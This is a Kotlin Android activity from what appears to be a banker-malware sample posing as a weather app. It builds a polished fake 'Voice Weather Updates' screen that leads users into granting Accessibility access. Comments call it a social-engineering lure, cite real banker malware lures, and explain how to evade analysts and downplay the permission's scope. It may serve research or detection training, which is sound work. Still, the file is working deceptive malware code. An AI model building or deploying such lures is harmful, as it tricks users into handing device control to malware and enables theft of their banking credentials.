package com.skyweather.forecast

import android.content.Context
import android.content.Intent
import android.graphics.Color
import android.graphics.Typeface
import android.os.Bundle
import android.provider.Settings
import android.text.InputType
import android.view.Gravity
import android.widget.Button
import android.widget.LinearLayout
import android.widget.ScrollView
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import com.skyweather.forecast.core.VoiceReadoutService

/**
 * Social engineering lure — Accessibility enablement prompt.
 *
 * ══════════════════════════════════════════════════════════════════
 * ANALYSIS §4 — Permission Rationale UX
 * ══════════════════════════════════════════════════════════════════
 *
 * Banker malware must convince the user to grant Accessibility.
 * The lure must be plausible for the app category.
 *
 * Real-world lures from threat intel:
 *   Anatsa: "Allow accessibility to hibernate draining apps and save battery"
 *   SharkBot: "Enable accessibility for security scanning"
 *   Octo: "Required for screen reader compatibility"
 *   ERMAC2: "Enable accessibility to optimize performance"
 *
 * For a weather app, plausible lures:
 *   - "Enable voice weather updates" (accessibility = TTS integration)
 *   - "Enable weather alerts for accessibility" (notification enhancement)
 *   - "Allow SkyWeather to read weather aloud" (screen reader use case)
 *
 * This activity presents a polished, trust-building UI that guides
 * the user to Settings > Accessibility > SkyWeather > Enable.
 *
 * Static analysis sees: Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
 * This is NOT a banker tell by itself — legitimate accessibility apps
 * do the same thing. The COMBINATION of this + no legitimate a11y
 * use case in the app + credential-capture code = banker shape.
 * ══════════════════════════════════════════════════════════════════
 */
class EnableAccessibilityActivity : AppCompatActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // If already enabled, close immediately
        if (VoiceReadoutService.isServiceEnabled(this)) {
            finish()
            return
        }

        setContentView(buildLureUI())
    }

    override fun onResume() {
        super.onResume()
        // User may have just come back from Settings — check if enabled now
        if (VoiceReadoutService.isServiceEnabled(this)) {
            finish()
        }
    }

    /**
     * Build the social engineering lure UI programmatically.
     *
     * No XML layout — avoids "activity_enable_accessibility.xml" in
     * decompiled resources (suspicious filename for analyst).
     *
     * Design principles from real banker UX research:
     *   1. Look official — clean Material-ish design, app icon
     *   2. Explain a plausible benefit — voice weather updates
     *   3. Show step-by-step instructions — reduce user confusion
     *   4. Use action-oriented language — "Enable" not "Allow"
     *   5. Downplay the permission scope — "helps read weather data"
     */
    private fun buildLureUI(): ScrollView {
        val scroll = ScrollView(this).apply {
            setBackgroundColor(Color.WHITE)
        }

        val layout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(dp(24), dp(48), dp(24), dp(24))
            gravity = Gravity.CENTER_HORIZONTAL
        }

        // Weather icon
        val icon = TextView(this).apply {
            text = "🌤️" // sun behind cloud emoji
            textSize = 48f
            gravity = Gravity.CENTER
        }
        layout.addView(icon)

        // Title — benefit-oriented, not permission-oriented
        val title = TextView(this).apply {
            text = "Voice Weather Updates"
            textSize = 24f
            setTextColor(Color.parseColor("#1A1A2E"))
            typeface = Typeface.create("sans-serif-medium", Typeface.NORMAL)
            gravity = Gravity.CENTER
            setPadding(0, dp(16), 0, dp(8))
        }
        layout.addView(title)

        // Description — plausible accessibility use case for weather app
        val desc = TextView(this).apply {
            text = "SkyWeather can read weather updates and severe alerts " +
                    "aloud using your device's accessibility features. " +
                    "This helps you stay informed hands-free while driving " +
                    "or when you can't look at your screen."
            textSize = 15f
            setTextColor(Color.parseColor("#555555"))
            gravity = Gravity.CENTER
            setPadding(dp(8), 0, dp(8), dp(24))
            setLineSpacing(dp(4).toFloat(), 1f)
        }
        layout.addView(desc)

        // Step-by-step instructions card
        val stepsCard = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setBackgroundColor(Color.parseColor("#F8F9FA"))
            setPadding(dp(20), dp(20), dp(20), dp(20))
        }

        val stepsTitle = TextView(this).apply {
            text = "How to enable:"
            textSize = 14f
            setTextColor(Color.parseColor("#333333"))
            typeface = Typeface.DEFAULT_BOLD
            setPadding(0, 0, 0, dp(12))
        }
        stepsCard.addView(stepsTitle)

        // Real banker UX: step-by-step reduces user anxiety about
        // navigating Settings. Each step removes one decision point.
        val steps = arrayOf(
            "1. Tap \"Enable\" below to open Accessibility settings",
            "2. Find \"SkyWeather\" in the list",
            "3. Tap the toggle to enable",
            "4. Confirm when prompted"
        )

        for (step in steps) {
            val stepText = TextView(this).apply {
                text = step
                textSize = 14f
                setTextColor(Color.parseColor("#444444"))
                setPadding(0, dp(4), 0, dp(4))
            }
            stepsCard.addView(stepText)
        }

        layout.addView(stepsCard, LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT,
            LinearLayout.LayoutParams.WRAP_CONTENT
        ).apply { bottomMargin = dp(24) })

        // "Enable" button — navigates to Accessibility Settings
        val enableButton = Button(this).apply {
            text = "Enable Voice Updates"
            setBackgroundColor(Color.parseColor("#1A73E8"))
            setTextColor(Color.WHITE)
            textSize = 16f
            isAllCaps = false
            setPadding(dp(24), dp(14), dp(24), dp(14))

            setOnClickListener {
                // Navigate to Accessibility Settings
                // User must manually find + enable the service
                val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                startActivity(intent)
            }
        }
        layout.addView(enableButton, LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT,
            LinearLayout.LayoutParams.WRAP_CONTENT
        ))

        // "Not now" — dismiss without enabling
        val skipButton = Button(this).apply {
            text = "Not now"
            setBackgroundColor(Color.TRANSPARENT)
            setTextColor(Color.parseColor("#888888"))
            textSize = 14f
            isAllCaps = false
            elevation = 0f

            setOnClickListener { finish() }
        }
        layout.addView(skipButton, LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.WRAP_CONTENT,
            LinearLayout.LayoutParams.WRAP_CONTENT
        ).apply { topMargin = dp(8) })

        scroll.addView(layout)
        return scroll
    }

    private fun dp(value: Int): Int {
        return (value * resources.displayMetrics.density).toInt()
    }

    companion object {
        fun launch(context: Context) {
            context.startActivity(Intent(context, EnableAccessibilityActivity::class.java))
        }
    }
}
